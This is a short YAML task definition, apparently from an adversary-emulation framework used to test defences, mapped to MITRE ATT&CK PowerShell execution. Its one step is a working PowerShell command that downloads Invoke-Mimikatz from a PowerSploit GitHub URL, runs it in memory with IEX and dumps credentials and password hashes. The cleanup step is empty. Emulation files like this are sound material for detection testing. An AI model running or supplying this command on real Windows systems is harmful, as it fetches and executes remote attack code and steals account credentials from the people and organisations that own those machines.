api_version: "2.0"
name: Mimikatz
description: |
    Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.
args:
    - name: mimurl
      type: url
      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
uuid: f3132740-55bc-48c4-bcc0-758a459cd027
mitre:
    tactics:
        - 'TA0002: Execution'
    techniques:
        - 'T1059: Command and Scripting Interpreter'
    subtechniques:
        - 'T1059.001: PowerShell'
requirements:
    platforms:
        - os: windows
steps:
    - name: mimikatz
      inline: |
        powershell.exe "IEX (New-Object Net.WebClient).DownloadString('{{.Args.mimurl}}'); Invoke-Mimikatz -DumpCreds"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
